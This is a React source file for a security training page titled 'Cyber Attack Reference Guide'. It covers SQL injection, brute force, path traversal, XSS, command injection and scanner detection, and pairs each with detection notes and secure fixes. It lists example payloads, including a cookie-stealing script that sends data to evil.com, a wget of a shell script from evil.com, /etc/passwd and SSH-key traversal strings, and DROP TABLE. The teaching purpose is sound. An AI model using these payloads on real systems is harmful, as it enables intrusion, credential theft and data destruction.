'use client'
import { useState } from 'react'
import AppShell from '@/components/AppShell'

const ATTACKS = [
  {
    id: 'sql', icon: '💉', name: 'SQL Injection',
    owasp: 'A03:2021', cwe: 'CWE-89', severity: 'CRITICAL', ban: '24 hours',
    desc: 'Attacker injects malicious SQL into query parameters to bypass authentication, extract data, or destroy the database.',
    how: `// Vulnerable query:
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

// Attacker input: ' OR '1'='1'--
// Result: logs in as first user (admin)`,
    payloads: ["' OR '1'='1--", "admin' UNION SELECT username,password FROM users--", "1'; DROP TABLE users--", "1 AND SLEEP(5)--"],
    detect: "25+ regex patterns including UNION SELECT, DROP TABLE, OR 1=1, SLEEP(), xp_cmdshell",
    fix: `# ❌ Vulnerable
query = f"SELECT * FROM users WHERE id={user_id}"

# ✅ Secure — parameterized query
cursor.execute("SELECT * FROM users WHERE id=?", (user_id,))`,
  },
  {
    id: 'brute', icon: '🔨', name: 'Brute Force',
    owasp: 'A07:2021', cwe: 'CWE-307', severity: 'HIGH', ban: '1 hour',
    desc: 'Attacker makes repeated login attempts with different passwords until finding the correct one.',
    how: `POST /login {user: admin, pass: password1}  → 401
POST /login {user: admin, pass: password2}  → 401
...
POST /login {user: admin, pass: secret123}  → 200 ✅`,
    payloads: ['admin:password', 'admin:123456', 'root:root', 'user:pass'],
    detect: "Sliding window counter: 5+ failed logins from same IP in 60 seconds",
    fix: `# Rate limiting + account lockout
@limiter.limit("5 per minute")
def login():
    if failed_attempts >= 5:
        lock_account(user, duration=300)`,
  },
  {
    id: 'path', icon: '📁', name: 'Path Traversal',
    owasp: 'A01:2021', cwe: 'CWE-22', severity: 'CRITICAL', ban: '24 hours',
    desc: 'Attacker uses ../ sequences to navigate outside the web root and read sensitive system files.',
    how: `/files?name=../../../../etc/passwd
→ /var/www/html/files/../../../../etc/passwd
→ /etc/passwd  ← reads system password file!`,
    payloads: ['../../../../etc/passwd', '../../../../.ssh/id_rsa', '%2e%2e%2f%2e%2e%2fetc%2fshadow'],
    detect: "20+ patterns including ../, URL-encoded variants, sensitive file targets (/etc/passwd, .ssh/id_rsa)",
    fix: `# ✅ Secure path validation
SAFE_ROOT = "/var/www/html/files"
safe_path = os.path.realpath(os.path.join(SAFE_ROOT, filename))
if not safe_path.startswith(SAFE_ROOT):
    raise PermissionError("Access denied")`,
  },
  {
    id: 'xss', icon: '🕷️', name: 'XSS',
    owasp: 'A03:2021', cwe: 'CWE-79', severity: 'HIGH', ban: 'Rate limited',
    desc: 'Attacker injects malicious JavaScript into web pages that executes in victims\' browsers.',
    how: `// Reflected XSS
/search?q=<script>alert(document.cookie)</script>

// Stored XSS — saved to DB, shown to all users
Comment: <script>fetch('http://evil.com?c='+document.cookie)</script>`,
    payloads: ['<script>alert(document.cookie)</script>', '<img src=x onerror=alert(1)>', 'javascript:alert(1)', '<svg onload=alert(1)>'],
    detect: "Script tags, event handlers (onerror, onload), javascript: protocol, eval(), document.cookie",
    fix: `# ❌ Vulnerable
return f'<p>Results for: {user_input}</p>'

# ✅ Secure
from markupsafe import escape
return f'<p>Results for: {escape(user_input)}</p>'`,
  },
  {
    id: 'cmd', icon: '⚡', name: 'Command Injection',
    owasp: 'A03:2021', cwe: 'CWE-78', severity: 'CRITICAL', ban: '24 hours',
    desc: 'Attacker injects OS commands into application inputs that get executed by the server.',
    how: `# Vulnerable code
os.system(f"ping -c 1 {host}")

# Attacker input: localhost; cat /etc/passwd
# Executed: ping -c 1 localhost; cat /etc/passwd`,
    payloads: ['localhost;cat /etc/passwd', '127.0.0.1|id', 'x;/bin/bash -i', 'x;wget http://evil.com/shell.sh'],
    detect: "Shell metacharacters: ; | && || ` $() — followed by dangerous commands (cat, bash, wget, curl)",
    fix: `# ❌ Vulnerable
subprocess.run(f"ping -c 1 {user_input}", shell=True)

# ✅ Secure — list args, no shell
subprocess.run(["ping", "-c", "1", validated_host])`,
  },
  {
    id: 'bot', icon: '🤖', name: 'Bot Scanner',
    owasp: 'T1595', cwe: '—', severity: 'MEDIUM', ban: 'Rate limited',
    desc: 'Automated tools that scan for vulnerabilities before a real attack. Detected by User-Agent strings.',
    how: `Reconnaissance phase of the attack kill chain:
Bot Scan → Scanning → Exploitation → Persistence → Exfiltration

Detected tools: sqlmap, Nikto, masscan, dirbuster, Nessus, Metasploit, zgrab`,
    payloads: ['sqlmap/1.7.8', 'Nikto/2.1.6', 'masscan/1.0', 'dirbuster/1.0'],
    detect: "User-Agent string matching against 20+ known scanner signatures",
    fix: `# Block known scanner IPs via WAF
# Implement robots.txt with Disallow: /
# Deploy honeypot endpoints
# Subscribe to threat intelligence feeds`,
  },
]

const SEV_STYLE: Record<string, string> = {
  CRITICAL: 'bg-red-900/40 text-red-300 border-red-700/50',
  HIGH: 'bg-orange-900/40 text-orange-300 border-orange-700/50',
  MEDIUM: 'bg-yellow-900/40 text-yellow-300 border-yellow-700/50',
}

export default function GuidePage() {
  const [active, setActive] = useState('sql')
  const atk = ATTACKS.find(a => a.id === active)!

  return (
    <AppShell>
      <div className="max-w-5xl mx-auto space-y-4">
        <h1 className="text-xl font-bold text-white">📖 Cyber Attack Reference Guide</h1>

        {/* Tab bar */}
        <div className="flex flex-wrap gap-1">
          {ATTACKS.map(a => (
            <button
              key={a.id}
              onClick={() => setActive(a.id)}
              className={`text-sm px-4 py-2 rounded-md border transition-colors ${active === a.id ? 'bg-red-900/40 border-red-700/50 text-red-300' : 'border-border text-muted hover:text-white'}`}
            >
              {a.icon} {a.name}
            </button>
          ))}
        </div>

        {/* Content */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          <div className="space-y-4">
            <div className="card">
              <div className="flex items-center gap-3 mb-3">
                <span className="text-3xl">{atk.icon}</span>
                <div>
                  <h2 className="font-bold text-white text-lg">{atk.name}</h2>
                  <div className="flex gap-2 mt-1">
                    <span className="text-xs text-muted">{atk.owasp}</span>
                    <span className="text-xs text-muted">·</span>
                    <span className="text-xs text-muted">{atk.cwe}</span>
                    <span className={`text-xs px-1.5 py-0.5 rounded border ${SEV_STYLE[atk.severity] || ''}`}>{atk.severity}</span>
                  </div>
                </div>
              </div>
              <p className="text-sm text-muted">{atk.desc}</p>
              <div className="mt-3 flex gap-3 text-xs">
                <div className="bg-bg rounded px-2 py-1 border border-border">
                  <span className="text-muted">Ban: </span><span className="text-white">{atk.ban}</span>
                </div>
              </div>
            </div>

            <div className="card">
              <h3 className="text-sm font-semibold text-muted uppercase tracking-wide mb-2">How It Works</h3>
              <pre className="text-xs text-green-300 bg-bg rounded p-3 overflow-auto">{atk.how}</pre>
            </div>

            <div className="card">
              <h3 className="text-sm font-semibold text-muted uppercase tracking-wide mb-2">Example Payloads</h3>
              <div className="space-y-1">
                {atk.payloads.map(p => (
                  <code key={p} className="block text-xs text-yellow-300 bg-bg rounded px-3 py-1.5 border border-border/50">{p}</code>
                ))}
              </div>
            </div>
          </div>

          <div className="space-y-4">
            <div className="card">
              <h3 className="text-sm font-semibold text-muted uppercase tracking-wide mb-2">Detection Method</h3>
              <p className="text-sm text-blue-300 bg-blue-900/20 border border-blue-800/40 rounded p-3">{atk.detect}</p>
            </div>

            <div className="card">
              <h3 className="text-sm font-semibold text-muted uppercase tracking-wide mb-2">Prevention / Fix</h3>
              <pre className="text-xs text-green-300 bg-bg rounded p-3 overflow-auto">{atk.fix}</pre>
            </div>

            <div className="card">
              <h3 className="text-sm font-semibold text-muted uppercase tracking-wide mb-2">Try It</h3>
              <p className="text-xs text-muted mb-3">Go to the Attack Launcher to fire this attack type against the test system.</p>
              <a href="/launcher" className="btn-primary text-sm inline-block">
                🚀 Launch {atk.name} →
              </a>
            </div>
          </div>
        </div>
      </div>
    </AppShell>
  )
}
